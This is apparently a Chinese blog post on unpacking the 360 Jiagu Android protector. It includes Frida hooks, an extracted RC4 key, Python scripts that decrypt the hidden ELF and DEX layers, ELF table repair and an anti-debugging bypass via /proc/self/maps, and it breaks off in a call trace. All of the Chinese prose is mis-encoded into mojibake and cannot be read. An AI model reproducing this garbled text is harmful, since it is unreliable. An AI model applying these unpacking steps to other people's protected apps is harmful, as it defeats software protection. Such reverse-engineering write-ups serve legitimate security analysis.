æ‰“å°å‡ºæ¥çš„å†…å®¹ä¸­ï¼Œæå–å…³é”®çš„éƒ¨åˆ†æ‹¿è¿‡æ¥çœ‹çœ‹ï¼Œè¯´æ˜ sub_4B54 æ˜¯è¢« sub_8000 è°ƒç”¨çš„ call43:sub_8000 &lt;--call44:dlopencall45:sub_60E0call46:sub_6544call47:sub_4B54 &lt;--call48:sub_6128call49:_ZN9__arm_c_19__arm_c_0Evcall50:sub_A3ECcall51:sub_99CCcall52:sub_9944call53:sub_6484call54:sub_6590call55:prctlcall56:sub_6698call57:sub_9FFCcall58:j_lseek_3call59:j_lseek_2call60:j_lseek_0call61:sub_9A90call62:sub_5F20call63:sub_6044call64:sub_3574call65:uncompresscall66:sub_49F0 &lt;--call67:sub_5400call68:sub_5478call69:sub_5B08call70:sub_5650call71:sub_580Ccall72:opencall73:atoicall74:sub_3C94 &lt;--sub_8000 çš„å‡½æ•°é•¿è¿™ä¸ªæ ·å­ï¼Œè¯·è®°ä½ç¬¬ 25 è¡Œ 0xB8010 è¿™ä¸ªæ•°å­—ï¼Œåé¢ä¼šæ´¾ä¸Šç”¨åœºçš„ è·Ÿç€å‡½æ•°è°ƒç”¨é“¾ä¸€å¤„ä¸€å¤„çš„åœ¨ IDA ä¸­è·³è½¬åˆ°ç›¸åº”çš„åœ°å€è¿›è¡ŒæŸ¥çœ‹ï¼Œåœ¨ call62:sub_5F20 æˆ‘ä»¬å‘ç°äº†æœ‰æ„æ€çš„ä»£ç  è¿™ä¸ªå‡½æ•°ï¼Œä¸€çœ¼ RC4 å‘€ ç”¨ frida å» hook ä¸€ä¸‹è¿™ä¸ªå‡½æ•°çœ‹çœ‹ RC4 çš„å¯†é’¥æ˜¯ä»€ä¹ˆ function hook_5f20_guess_rc4()&#123;// åƒæ˜¯ RC4 çš„æ ·å­ï¼Œhook çœ‹çœ‹ var module = Process.findModuleByName(\"libjiagu_64.so\"); Interceptor.attach(module.base.add(0x5f20), &#123; // fd, buff, len onEnter: function (args) &#123; console.log(hexdump(args[0], &#123; offset: 0,// ç›¸å¯¹åç§» length: 0x10,//dump çš„å¤§å° header: true, ansi: true &#125;)); console.log(args[1]) console.log(hexdump(args[2], &#123; offset: 0,// ç›¸å¯¹åç§» length: 256,//dump çš„å¤§å° header: true, ansi: true &#125;)); &#125;, onLeave: function (ret) &#123; &#125; &#125;);&#125; æ‰€ä»¥å¯†é’¥å°±æ˜¯è¿™ä¸ªå’¯ key = b\"vUV4#\\x91#SVt\"ç»§ç»­è·Ÿç€å‡½æ•°è°ƒç”¨é“¾èµ°ï¼Œåœ¨ call63:sub_6044 æˆ‘ä»¬å‘ç°äº† RC4 çš„è§£å¯†å‡½æ•° hook ä¸€ä¸‹ call63:sub_6044 çœ‹çœ‹åˆ°åº•ç»™ä»€ä¹ˆæ•°æ®è§£å¯†äº† var rc4_enc_text_addr,rc4_enc_size;function hook_rc4_enc()&#123; var module = Process.findModuleByName(\"libjiagu_64.so\"); Interceptor.attach(module.base.add(0x6044), &#123; // fd, buff, len onEnter: function (args) &#123; rc4_enc_text_addr = args[0]; rc4_enc_size = args[1]; console.log(hexdump(args[0], &#123; offset: 0,// ç›¸å¯¹åç§» length: 0x30,//dump çš„å¤§å° header: true, ansi: true &#125;)); console.log(args[1]) &#125;, onLeave: function (ret) &#123; console.log(hexdump(rc4_enc_text_addr, &#123; offset: 0,// ç›¸å¯¹åç§» length: 0x30,//dump çš„å¤§å° header: true, ansi: true &#125;)); &#125; &#125;);&#125; è¿™ä¸ªå‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°æ˜¯ 0xb8010 , æ„Ÿè§‰æ˜¯è§£å¯†çš„æ•°æ®çš„é•¿åº¦çš„æ ·å­ï¼Œè€Œä¸”è¿™ä¸ªæ•°å­—ï¼Œæœ‰æ²¡æœ‰æ„Ÿè§‰åœ¨å“ªé‡Œè§è¿‡å‘¢ï¼Ÿ æ²¡é”™ï¼Œè¿™ä¸ªæ•°å­—åˆšåˆšå°±å‡ºç°åœ¨ sub_8000 ä¸­ è€Œ v5[0] çš„å€¼æ˜¯ qword_2E270 , è¿™ä¸ªæ•°ç»„ä¹Ÿæ˜¯ 01 18 25 e7 å¼€å¤´çš„ ç»§ç»­è·Ÿç€è°ƒç”¨é“¾èµ°ï¼Œæ¥ä¸‹æ¥æ˜¯è°ƒç”¨ call65:uncompress , è¿›è¡Œè§£å‹ç¼©æ“ä½œ function hook_uncompress_res()&#123; var module = Process.findModuleByName(\"libjiagu_64.so\"); Interceptor.attach(Module.findExportByName(null, \"uncompress\"), &#123; onEnter: function (args) &#123; console.log(\"hook uncompress\") console.log(hexdump(args[2], &#123; offset: 0,// ç›¸å¯¹åç§» length: 0x30,//dump çš„å¤§å° header: true, ansi: true &#125;)); console.log(args[3]) dump_memory(args[2],args[3],`uncompress_$&#123;args[2]&#125;_$&#123;args[3]&#125;`) &#125;, onLeave: function (ret) &#123; &#125; &#125;);&#125;æˆ‘ä»¬å‘ç°è§£å‹ç¼©çš„æ•°æ®ï¼Œå‰é¢å››ä¸ªå­—èŠ‚ b9 0e 1a 00 æ²¡æœ‰åŒ…å«åœ¨è§£å‹ç¼©çš„å­—èŠ‚ä¹‹å†… ç°åœ¨æ—¢ç„¶æˆ‘ä»¬å·²ç»çŸ¥é“äº†ä¸» ELF åœ¨å£³ ELF ä¸­çš„ä½ç½®ï¼Œä»¥åŠè§£å¯†çš„ç®—æ³•ï¼Œé‚£æˆ‘ä»¬ç›´æ¥ä»è§£å‹ apk, æ‰¾åˆ°é‡Œé¢çš„ assets/libjiagu_a64.so , ä¸å°±èƒ½ç›´æ¥æŠŠå£³ ELF è§£å¯†å‡ºæ¥å’¯ import zlibimport structdef RC4(data, key): S = list(range(256)) j = 0 out = [] # KSA Phase for i in range(256): j = (j + S[i] + key[i % len(key)]) % 256 S[i], S[j] = S[j], S[i] # PRGA Phase i = j = 0 for ch in data: i = (i + 1) % 256 j = (j + S[i]) % 256 S[i], S[j] = S[j], S[i] out.append(ch ^ S[(S[i] + S[j]) % 256]) return outdef RC4decrypt(ciphertext, key): return RC4(ciphertext, key)wrap_elf_start = 0x1e270wrap_elf_size = 0xb8010key = b\"vUV4#\\x91#SVt\"with open('com.oacia.apk_protect/assets/libjiagu_a64.so','rb') as f: wrap_elf = f.read()# å¯¹å¯†æ–‡è¿›è¡Œè§£å¯†dec_compress_elf = RC4decrypt(wrap_elf[wrap_elf_start:wrap_elf_start+wrap_elf_size], key)dec_elf = zlib.decompress(bytes(dec_compress_elf[4::]))with open('wrap_elf','wb') as f: f.write(dec_elf)è§£å¯†å®Œæˆåï¼Œæˆ‘ä»¬å‘ç° 0x1a0eb9 åº”è¯¥è¡¨ç¤ºè§£å‹ç¼©ä¹‹åæ•°æ®çš„å¤§å° wrap_elf çš„å‰åŠéƒ¨åˆ†æ˜¯ä¸€å¤§å †è«åå…¶å¦™æœ‰å¾ˆå¤š D3 çš„ä¸œè¥¿ï¼Œä½†æ˜¯çœ‹åˆ°ä¸­é—´è¿˜æ˜¯å‘ç°äº†å£³ ELF çš„èº«å½± æˆ‘ä»¬ä»¥ .ELF ä¸ºæ ‡å¿—å°†è¿™ä¸¤éƒ¨åˆ†åˆ†ç¦»ä¸€ä¸‹ with open('wrap_elf', 'rb') as f: wrap_elf = f.read()ELF_magic = bytes([0x7F, 0x45, 0x4C, 0x46])for i in range(len(wrap_elf) - len(ELF_magic) + 1): if wrap_elf[i:i + len(ELF_magic)] == ELF_magic: print(hex(i)) with open('wrap_elf_part1', 'wb') as f: f.write(wrap_elf[0:i]) with open('wrap_elf_part2', 'wb') as f: f.write(wrap_elf[i::]) breakè·Ÿç€å‡½æ•°è°ƒç”¨é“¾æ¥åˆ° call69:sub_5B08 , è¿™é‡Œåˆå‡ºç°äº† 0x38 , å¹¶ä¸” word_38 è·³è½¬è¿‡å»çš„å€¼ä¸º 6 è¿™æ­£å¥½å’Œ phentsize å’Œ phnum çš„å€¼ç›¸å¯¹åº” æ‰€ä»¥å¯æƒ³è€ŒçŸ¥ï¼Œè¿™åˆæ˜¯ä¸€ä¸ªå…³é”®ç‚¹äº†ï¼Œå¾€ä¸‹çœ‹ä¸€ä¸‹ä»£ç ï¼Œå‘ç°äº†å¾ªç¯å¼‚æˆ–ï¼Œé‚£æˆ‘ä»¬ä¸å¦¨ç”¨ frida æŠŠ v4 çš„å€¼ hook ä¸‹æ¥çœ‹çœ‹æ˜¯ä»€ä¹ˆ v4 çš„å€¼å‡ºç°äº†é‚£ä¹ˆå¤šçš„ d3 è€Œè¿™å°±æ˜¯ wrap_elf çš„å‰åŠéƒ¨åˆ†é‚£ä¸€å¤§å †æˆ‘ä»¬çœ‹ä¸æ‡‚çš„å­—èŠ‚ æ¥ä¸‹æ¥ç”¨æ¥è§£å¯†çš„å¾ªç¯å°±æ˜¯ä¸€ä¸ª arm64 çš„ neon è¿ç®— å®˜ç½‘å¯ä»¥æ‰¾åˆ° vdupq_n_s8 å’Œ veorq_s8, æ ¹æ®å‡½æ•°æè¿°å¯ä»¥çŸ¥é“è¿™é‡Œç”¨å‘é‡è¿ç®—ï¼ŒæŠŠå‘é‡ä¸­çš„æ¯ä¸€ä¸ªå…ƒç´ éƒ½å¼‚æˆ–äº† 0xd3 å¯¹ sub_5B08 è¿›è¡Œåˆ†æä¹‹åï¼Œæˆ‘ä»¬ä¾¿å¯ä»¥çŸ¥é“ wrap_elf_part1 çš„è¯»å–æ–¹å¼æ˜¯ç¬¬ä¸€ä¸ªå­—èŠ‚è¡¨ç¤ºè¢«å¼‚æˆ–çš„æ•°å­—ï¼Œè¿™é‡Œæ˜¯ 0xD3 , åé¢çš„å››ä¸ªå­—èŠ‚è¡¨ç¤ºä¸€ä¸ªæ®µçš„é•¿åº¦ï¼Œéšåè¯»å–æŒ‡å®šé•¿åº¦çš„å­—èŠ‚å¹¶å¼‚æˆ–ï¼Œä¹‹åå†è¯»å–å››ä¸ªå­—èŠ‚è·å–åˆ°ä¸‹ä¸€ä¸ªæ®µçš„é•¿åº¦ï¼Œä»¥æ­¤ç±»æ¨ï¼Œç›´åˆ°è¯»å–åˆ°æ–‡ä»¶æœ«å°¾ åœ¨ sub_5B08 çš„æœ€åï¼Œå› ä¸º v31 , v19 , v43 , v7 ä»£è¡¨å¯¹åº”çš„æ•°æ®ç»„çš„é•¿åº¦ï¼Œæ‰€ä»¥è¿™é‡Œå…±æœ‰å››ä¸ªæ•°æ®ç»„ï¼Œè€Œä¸ºäº†è¡¨ç¤ºæ¯ä¸€ä¸ªæ•°æ®ç»„çš„é•¿åº¦å…±éœ€å ç”¨ 4*4=16 å­—èŠ‚ï¼Œå¹¶ä¸”æ–‡ä»¶å¼€å¤´è¿˜æœ‰ 1 ä½çš„å¼‚æˆ–å€¼ï¼Œäºæ˜¯è¿™äº›é•¿åº¦åŠ èµ·æ¥ï¼Œ *(a1 + 0x98) çš„åç§»å°±æ¥åˆ°äº†ä¸» ELF çš„é­”æœ¯å¤´ .ELF çš„ä½ç½®äº† æˆ‘ä»¬å¯ä»¥åœ¨ sub_5B08 ä¸­ä¸ºå˜é‡ a1 å®šä¹‰ä¸€ä¸ªç»“æ„ä½“ï¼Œæˆå‘˜åˆ†åˆ«è¡¨ç¤ºæ•°æ®ç»„çš„ 1,2,3,4 è¿™å››ä¸ªéƒ¨åˆ†ï¼Œè¿™æ ·æˆ‘ä»¬å°±çŸ¥é“è¿™å››ä¸ªéƒ¨åˆ†åˆ†åˆ«è¢«ç”¨åˆ°ä»€ä¹ˆåœ°æ–¹äº† struct deal_extra&#123; char blank[72]; int phnum; int *extra_part1; int phdr_size; char blank2[36]; int *extra_part2; int *extra_part3; int *extra_part4; int *main_elf;&#125;; æ¥ä¸‹æ¥å†æ‹ä¸€ä¸‹å‡½æ•°çš„è°ƒç”¨é“¾ sub_49F0-&gt;sub_5478(&amp;v16, a1, v4)-&gt;sub_5B08(a1, a2, a3) , åœ¨ sub_5B08 ä¸­ï¼Œæˆ‘ä»¬æŠŠ a1 çš„ç±»å‹å®šä¹‰æˆäº† deal_extra , æ‰€ä»¥ç†æ‰€åº”å½“çš„ï¼Œæˆ‘ä»¬ä¹ŸæŠŠ sub_49F0 ä¸­çš„å˜é‡ v16 çš„ç±»å‹å®šä¹‰ä¸º deal_extra åœ¨ sub_49F0 ä¸­æˆ‘ä»¬å‘ç°æˆå‘˜ extra_part èµ‹å€¼ç»™äº†å˜é‡ v7 , æ‰€ä»¥æˆ‘ä»¬ä¹Ÿä¸º v7 å»ºç«‹ä¸€ä¸ªç»“æ„ä½“è®© v7 çš„åç§»å¯ä»¥å¯¹åº”è¿™äº›å˜é‡ struct deal_extra_B&#123; char blank[232]; int *extra_part1; char blank1[8]; int phnum; int *extra_part4; char blank2[24]; int *extra_part2; char blank3[8]; int *extra_part3;&#125;; è¿™æ ·åšæœ‰ä»€ä¹ˆæ„ä¹‰å‘¢ï¼Ÿ æˆ‘ä»¬å‘ç°å˜é‡ v7 åˆ†åˆ«è¢«ä¼ å…¥åˆ°äº† sub_3C94 å’Œ sub_4918 ä¸­ï¼Œæˆ‘ä»¬åˆ†åˆ«è¿›å»çœ‹çœ‹ åœ¨ sub_3C94 ä¸­è§£æäº† extra_part4 , æ˜¾è€Œæ˜“è§ï¼Œè¿™ä¸ª switch æ˜¯ç”¨æ¥å¤„ç†åŠ¨æ€é“¾æ¥åº“çš„ï¼Œå³ extra_part4 å¯¹åº” .dynamic æ®µ åœ¨ sub_4918 ä¸­ï¼Œ extra_part2 å’Œ extra_part3 è¢«ä¼ å…¥åˆ° sub_4000 ä¸­ è€Œè¿™ä¸ªå‡½æ•°ä¸­çš„ switch æ˜¯ç”¨æ¥å¤„ç†é‡å®šä½çš„ï¼Œå› ä¸ºé‡å®šä½ä¸»è¦æœ‰åŸºå€é‡å®šä½å’Œç¬¦å·é‡å®šä½ï¼Œè¿™ä¸¤ä¸ªçš„å€¼åˆ†åˆ«æ˜¯ 0x403 å’Œ 0x402 æ‰€ä»¥ extra_part2 å’Œ extra_part3 åˆ†åˆ«å¯¹åº”ç€ .rela.dyn (403 é‡å®šä½) å’Œ .rela.plt (402 é‡å®šä½) è€Œä¹‹å extra_part1 è¢«ä¼ å…¥åˆ°äº† sub_5E6C ä¸­ è€Œæ¥åˆ° sub_5E6C ä¹Ÿæ¥åˆ°äº†æˆ‘ä»¬æœ€å¼€å§‹åˆ†æçš„èµ·ç‚¹ (å…œå…œè½¬è½¬åˆå›æ¥äº†), æ‰€ä»¥ extra_part1 è¡¨ç¤º program header table è‡³æ­¤ä¸ºæ­¢ï¼Œå››ä¸ªæ•°æ®ç»„æ‰€å¯¹åº”çš„æ®µéƒ½åˆ†æå®Œæˆ æ•°æ®ç»„1 è¡¨ç¤º program header table æ•°æ®ç»„2 è¡¨ç¤º .rela.plt æ•°æ®ç»„3 è¡¨ç¤º .rela.dyn æ•°æ®ç»„4 è¡¨ç¤º .dynamic æ‰€ä»¥æ¥ä¸‹æ¥ï¼Œå†™ä¸ªè„šæœ¬æŠŠè¿™å››ä¸ªæ•°æ®ç»„ç»™åˆ†ç¦»æˆå•ç‹¬çš„æ–‡ä»¶å’¯ import copyimport zlibdef RC4(data, key): S = list(range(256)) j = 0 out = [] # KSA Phase for i in range(256): j = (j + S[i] + key[i % len(key)]) % 256 S[i], S[j] = S[j], S[i] # PRGA Phase i = j = 0 for ch in data: i = (i + 1) % 256 j = (j + S[i]) % 256 S[i], S[j] = S[j], S[i] out.append(ch ^ S[(S[i] + S[j]) % 256]) return outdef RC4decrypt(ciphertext, key): return RC4(ciphertext, key)wrap_elf_start = 0x1e270wrap_elf_size = 0xb8010key = b\"vUV4#\\x91#SVt\"with open('com.oacia.apk_protect/assets/libjiagu_a64.so', 'rb') as f: wrap_elf = f.read()# å¯¹å¯†æ–‡è¿›è¡Œè§£å¯†dec_compress_elf = RC4decrypt(wrap_elf[wrap_elf_start:wrap_elf_start + wrap_elf_size], key)dec_elf = zlib.decompress(bytes(dec_compress_elf[4::]))with open('wrap_elf', 'wb') as f: f.write(dec_elf)class part: def __init__(self): self.name = \"\" self.value = b'' self.offset = 0 self.size = 0index = 1extra_part = [part() for _ in range(7)]seg = [\"phdr\", \".rela.plt\", \".rela.dyn\", \".dynamic\"]v_xor = dec_elf[0]for i in range(4): size = int.from_bytes(dec_elf[index:index + 4], 'little') index += 4 extra_part[i + 1].name = seg[i] extra_part[i + 1].value = bytes(map(lambda x: x ^ v_xor, dec_elf[index:index + size])) extra_part[i + 1].size = size index += sizefor p in extra_part: if p.value!=b'': filename = f\"libjiagu.so_&#123;hex(p.size)&#125;_&#123;p.name&#125;\" print(f\"[&#123;p.name&#125;] get &#123;filename&#125;, size: &#123;hex(p.size)&#125;\") with open(filename,'wb') as f: f.write(p.value)äºæ˜¯æˆ‘ä»¬å¾—åˆ°äº†è¿™å››ä¸ªæ–‡ä»¶ # ä¸» ELF å¯¼å…¥å¯¼å‡ºè¡¨ä¿®å¤ éœ€è¦è¢«ä¿®å¤çš„ä¸» ELF æ˜¯æˆ‘ä»¬åœ¨ä» assets/libjiagu_a64.so åˆ©ç”¨ RC4 å’Œ decompress è§£å¯†å‡ºæ¥çš„æ–‡ä»¶çš„ååŠéƒ¨åˆ†é‚£ä¸ª ELF å¯ä»¥å†™ä¸ª python è„šæœ¬åˆ†ç¦»å‡ºåé¢çš„ ELF with open('wrap_elf', 'rb') as f: wrap_elf = f.read()ELF_magic = bytes([0x7F, 0x45, 0x4C, 0x46])for i in range(len(wrap_elf) - len(ELF_magic) + 1): if wrap_elf[i:i + len(ELF_magic)] == ELF_magic: with open('libjiagu_0xe7000.so', 'wb') as f: f.write(wrap_elf[i::]) breakç°åœ¨æˆ‘ä»¬æ‹¿åˆ°äº†ä¸» ELF çš„å››ä¸ªé‡è¦çš„æ•°æ®æ®µï¼Œåˆ†åˆ«æ˜¯ phdr , .rela.plt , .rela.dyn , .dynamic , é‚£ä¹ˆæ¥ä¸‹æ¥éœ€è¦åšçš„å·¥ä½œå°±æ˜¯ä¿®å¤ä¸» ELF çš„å¯¼å…¥å¯¼å‡ºè¡¨äº†ï¼Œä¸ç„¶å¯¼å…¥å¯¼å‡ºå‡½æ•°éƒ½çœ‹ä¸è§æ€ä¹ˆé€†å˜ï½ åœ¨ä½¿ç”¨è‡ªå®ç° linker åŠ å›º so æ—¶ï¼Œ phdr , .rela.plt , .rela.dyn , .dynamic è¿™å››ä¸ªæ®µæ˜¯ä»å¾…åŠ å›ºçš„ so ä¸­æå–å‡ºæ¥ï¼Œç„¶ååŠ å¯†å­˜å‚¨åˆ°å…¶ä»–ä½ç½®ï¼Œ åŸæ¥çš„ä½ç½®ä¼šä½¿ç”¨æ— å…³å­—èŠ‚ç›´æ¥è¦†ç›– ç­‰åˆ°éœ€è¦ä¸ºåŠ å›ºçš„ so è¿›è¡Œé¢„é“¾æ¥å’Œé‡å®šä½çš„å·¥ä½œæ—¶ï¼Œæ‰å°†è¿™äº›æ®µè§£å¯†å¹¶é€šè¿‡è‡ªå·±å®ç°çš„é¢„é“¾æ¥å’Œé‡å®šä½ä»£ç ï¼Œè®©å¾…åŠ å›ºçš„ so å¯ä»¥æ­£ç¡®çš„è¢«å£³ so åŠ è½½å‡ºæ¥ æˆ‘ä»¬è¿›è¡Œä¿®å¤çš„æ–¹æ³•å…¶å®å°±è—åœ¨è¿™å¥è¯ä¸­ åŸæ¥çš„ä½ç½®ä¼šä½¿ç”¨æ— å…³å­—èŠ‚ç›´æ¥è¦†ç›– ï¼Œæˆ‘ä»¬å¯ä»¥å°†åˆ†ç¦»å‡ºæ¥çš„è¿™å››ä¸ªæ®µå†å¡å›åˆ°åŸæ¥çš„ä½ç½® è‡ªå®ç°linkeråŠ å›ºso çš„åŠ å›ºæ–¹æ¡ˆæ—¢ç„¶éƒ½æŠŠé‚£å››ä¸ªæ®µåŠ å¯†å­˜åˆ°å…¶ä»–åœ°æ–¹äº†ï¼Œé‚£æ€ä¹ˆä¸ç›´æ¥æŠŠåŸæ¥çš„å››ä¸ªæ®µç›´æ¥åˆ é™¤è€Œæ˜¯ç”¨æ— å…³å­—èŠ‚è¦†ç›–å‘¢ï¼Ÿ å› ä¸ºç›´æ¥æŠŠæ®µåˆ é™¤æ‰çš„è¯ï¼Œä¼šå½±å“äº†ä¸€æ•´ä¸ª ELF æ–‡ä»¶çš„å¸ƒå±€ï¼Œåç§»å°±ä¼šå˜å¾—å’ŒåŸå…ˆä¸ä¸€æ ·ï¼Œç„¶åäº§ç”Ÿå„ç§å¥‡å¥‡æ€ªæ€ªçš„é—®é¢˜ åœ¨ 010editor ä¸­ï¼ŒæŒ‰ä¸‹ ctrl+shift+C å¯ä»¥å¤åˆ¶æ•´å—å†…å­˜ï¼ŒæŒ‰ä¸‹ ctrl+shift+V å¯ä»¥ç²˜è´´æ•´å—å†…å­˜ ä¿®å¤ program header table å¤åˆ¶ libjiagu.so_0x150_phdr çš„æ‰€æœ‰å­—èŠ‚ï¼Œç„¶åæ¥åˆ° libjiagu_0xe7000.so ä¸­é€‰ä¸­ struct program_header_table ç²˜è´´ éšåæŒ‰ä¸‹ F5 åˆ·æ–°æ¨¡æ¿ ä¿®å¤ .dynamic program header table çš„ (RW_) Dynamic Segment çš„ p_offset æŒ‡å‘ .dynamic æ®µçš„ä½ç½® è·³è½¬åˆ°è¯¥ä½ç½®ï¼Œå¤åˆ¶ libjiagu.so_0x1b0_.dynamic çš„å†…å®¹å¹¶ç²˜è´´åˆ°è¿™ä¸ªä½ç½® ä¿®å¤é‡å®šä½è¡¨ æˆ‘ä»¬éœ€è¦é€šè¿‡ .dynamic æ®µçš„ d_tag å­—æ®µæ¥ç›´åˆ°é‡å®šä½è¡¨çš„ä½ç½®ï¼Œä¸‹é¢æ˜¯ AOSP ä¸­ d_tag çš„å®å®šä¹‰ æ‰€æœ‰çš„ d_tag æ ‡å¿—å¯¹åº”çš„å«ä¹‰å¯ä»¥åœ¨ ORACLE é“¾æ¥ç¨‹åºå’Œåº“æŒ‡å— ä¸­æ‰¾åˆ° å¯¹äºæˆ‘ä»¬ä¿®å¤ä¸» ELF æ¯”è¾ƒé‡è¦çš„ tag æœ‰ d_tag å€¼ å«ä¹‰ DT_JMPREL 0x17 .rela.plt åœ¨æ–‡ä»¶ä¸­çš„åç§» DT_PLTRELSZ 0x2 .rela.plt çš„å¤§å° DT_RELA 0x7 .rela.dyn åœ¨æ–‡ä»¶ä¸­çš„åç§» DT_RELASZ 0x8 .rela.dyn çš„å¤§å° æˆ‘ä»¬å¯ä»¥åœ¨ .dynamic ä¸­å‘ç°è¿™äº› tag ä»¥åŠå¯¹åº”çš„å€¼ çœ‹çœ‹è¿™ä¸¤ä¸ªå¤§å°åˆ†åˆ«æ˜¯ 0x1650 å’Œ 0x25188 , è¿™ä¸å°±å’Œæˆ‘ä»¬åˆšåˆšåˆ†ç¦»å‡ºæ¥çš„æ–‡ä»¶å¤§å°ä¸€æ¨¡ä¸€æ ·å˜›ï¼Œè¯´æ˜æˆ‘ä»¬ç¦»ä¿®å¤å®Œæˆä¸è¿œäº† ç„¶åå°±æ˜¯å’Œä¹‹å‰ä¸€æ ·ï¼Œè·³è½¬åˆ° .rela.plt å’Œ .rela.dyn çš„å¯¹åº”åœ°å€ï¼Œç„¶åæŠŠè¿™äº›æ®µæœ¬æ¥çš„æ•°æ®ç²˜è´´è¿›å» ç°åœ¨æˆ‘ä»¬å°±ä¿®å¤å¥½å•¦ï¼Œæ‹¿ ida æ‰“å¼€ä¸» ELF çœ‹çœ‹ï¼Œæ»¡æ»¡çš„éƒ½æ˜¯ç¬¦å·ï¼ éšä¾¿æ‰¾ä¸ªå¯¼å…¥å‡½æ•°äº¤å‰å¼•ç”¨çœ‹çœ‹ï¼Œä¸€åˆ‡æ­£å¸¸ (â—'â—¡'â—) ä¸ºäº†æ–¹ä¾¿èµ·è§ï¼Œæˆ‘ä»¬å¯ä»¥å°†ä¸» ELF çš„åŸºå€å®šä¹‰æˆåœ¨å…¶åœ¨å£³ ELF çš„åç§» 0xe7000 æ–¹ä¾¿åç»­çš„åˆ†æ # ä¸» DEX è§£å¯†æµç¨‹åˆæ­¥åˆ†æ è¿˜è®°å¾—åœ¨åŠ å›ºå£³åè°ƒè¯•åˆæ­¥åˆ†æä¸­ï¼Œæˆ‘ä»¬æ‹¿åˆ°äº†æœªè§£å¯†çš„ dex å˜› é‚£ä¹ˆæ¥ä¸‹æ¥æœ‰ä¸ªé—®é¢˜å°±æ˜¯ï¼Œè¿™ä¸ªæœªè§£å¯†çš„ dex ç©¶ç«Ÿè—åœ¨äº† apk çš„ä»€ä¹ˆåœ°æ–¹å‘¢ï¼Ÿ æˆ‘å°†æœªåŠ å›ºçš„ apk è§£å‹å‡ºæ¥ï¼Œç„¶åç”¨ 7zip å‹ç¼©å…¶ä¸­çš„ dex, å‘ç°å¤§å°ä¾ç„¶æœ‰ 2.8MB éšåæˆ‘å°†ç»è¿‡ 360 åŠ å›ºä¹‹åçš„ apk è§£å‹å‡ºæ¥ï¼ŒæŒ‰å¤§å°å¯¹æ–‡ä»¶è¿›è¡Œæ’åºä¹‹åå‘ç°ï¼Œæœ€å¤§çš„æ–‡ä»¶å°±åªæœ‰è¿™ä¸ªå£³ classes.dex , è€Œåˆ«çš„æ–‡ä»¶ç”šè‡³è¿ 1MB éƒ½æ²¡åˆ°ï¼Œæ€»ä¸å¯èƒ½å‹ç¼©ç‡å¯ä»¥é«˜åˆ°è¿™ç§åœ°æ­¥å§ æ‰€ä»¥æˆ‘ä»¬æ‰“å¼€ classes.dex çœ‹çœ‹ï¼Œåœ¨è¿™ä¸ª classes.dex çš„æœ«å°¾ï¼Œæœç„¶è—ç€ä¸€å¤§å †çš„æ•°æ® è€Œæœ«å°¾çš„æ•°æ®æ˜¯ç”± 71 68 00 01 å’Œæˆ‘ä»¬ä¹‹å‰çœ‹åˆ°çš„åŠ å¯†çš„ dex ä¸€æ¨¡ä¸€æ · æ¥ä¸‹æ¥æˆ‘ä»¬ç»§ç»­ç”¨ stalker_trace_so å»çœ‹çœ‹è¡¥å……ä¸Šä¸» ELF çš„å‡½æ•°åœ°å€ä»¥åŠåç§°ä¹‹åçš„å‡½æ•°è°ƒç”¨é“¾æ˜¯ä»€ä¹ˆæ ·å­çš„ï¼Œé¦–å…ˆåœ¨ä¸» ELF ä¸­è¿è¡Œæ’ä»¶ Edit-&gt;Plugins-&gt;stalker_trace_so ä¹‹ååŒæ ·çš„ï¼Œæˆ‘ä»¬éœ€è¦å°† so_name æ”¹æˆ libjiagu_64.so , ç‰¹åˆ«æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œæˆ‘ä»¬éœ€è¦æŠŠå£³ ELF çš„ func_addr å’Œ func_name ç»™å¤åˆ¶è¿‡æ¥ï¼ŒåŒæ—¶ä½¿ç”¨ concat æ–¹æ³•å°†ä¸» ELF å’Œå£³ ELF çš„å‡½æ•°åœ°å€å’Œå‡½æ•°åæ‹¼æ¥æˆä¸€ä¸ªæ–°çš„æ•°ç»„ ä¹‹å‰æ›¿æ¢ /proc/self/maps æ¥å®ç°åˆæ­¥åè°ƒè¯•çš„ js å‡½æ•° hook_proc_self_maps ä¹Ÿéœ€è¦åŒæ—¶æ‰§è¡Œ è¾“å‡ºç»“æœå¦‚ä¸‹ï¼Œ KEkeELF æ ‡å¿—è¡¨ç¤ºå£³ ELF, mainELF è¡¨ç¤ºä¸» ELF,(ä¸ºä»€ä¹ˆæ˜¯ KEke , åªæ˜¯ä¸ºäº†å¯¹é½çœ‹ç€èˆ’æœï¼š)) è¦åˆ¤æ–­è°ƒç”¨çš„å‡½æ•°åœ¨å“ªä¸ª ELF é‡Œé¢ï¼Œåœ¨ trace_so() é‡Œé¢ç¨ä½œä¿®æ”¹åˆ¤æ–­ä¸€ä¸‹èŒƒå›´å¯ä»¥äº† æ‰“å°å‡ºæ¥çš„ç»“æœå¦‚ä¸‹ (KEkeELF)call1:JNI_OnLoad(KEkeELF)call2:j_interpreter_wrap_int64_t(KEkeELF)call3:interpreter_wrap_int64_t (KEkeELF)call4:getenv (KEkeELF)call5:sub_13908 (KEkeELF)call6:inotify_add_watch (KEkeELF)call7:sub_11220(KEkeELF)call8:fopen(KEkeELF)call9:sub_9DD8(KEkeELF)call10:sub_E3E0(KEkeELF)call11:strtol(KEkeELF)call12:feof(KEkeELF)call13:raise(KEkeELF)call14:memset(KEkeELF)call15:sub_C918(KEkeELF)call16:sub_9988(KEkeELF)call17:sub_9964(KEkeELF)call18:sub_9AC4(KEkeELF)call19:j_ffi_prep_cif(KEkeELF)call20:ffi_prep_cif(KEkeELF)call21:j_ffi_prep_cif_machdep(KEkeELF)call22:ffi_prep_cif_machdep(KEkeELF)call23:j_ffi_call(KEkeELF)call24:ffi_call(KEkeELF)call25:sub_1674C(KEkeELF)call26:j_ffi_call_SYSV(KEkeELF)call27:ffi_call_SYSV(KEkeELF)call28:sub_167BC(KEkeELF)call29:sub_1647C(KEkeELF)call30:sub_163DC(KEkeELF)call31:sub_9900(KEkeELF)call32:sub_94BC(KEkeELF)call33:inotify_init(KEkeELF)call34:fmod(KEkeELF)call35:strncpy(KEkeELF)call36:_Z9__arm_a_1P7_JavaVMP7_JNIEnvPvRi(KEkeELF)call37:sub_9E58(KEkeELF)call38:sub_999C(KEkeELF)call39:sub_10964(KEkeELF)call40:j_lseek_1(KEkeELF)call41:lseek(KEkeELF)call42:sub_96E0(KEkeELF)call43:sub_8000(KEkeELF)call44:dlopen(KEkeELF)call45:sub_60E0(KEkeELF)call46:sub_6544(KEkeELF)call47:sub_4B54(KEkeELF)call48:sub_6128(KEkeELF)call49:_Z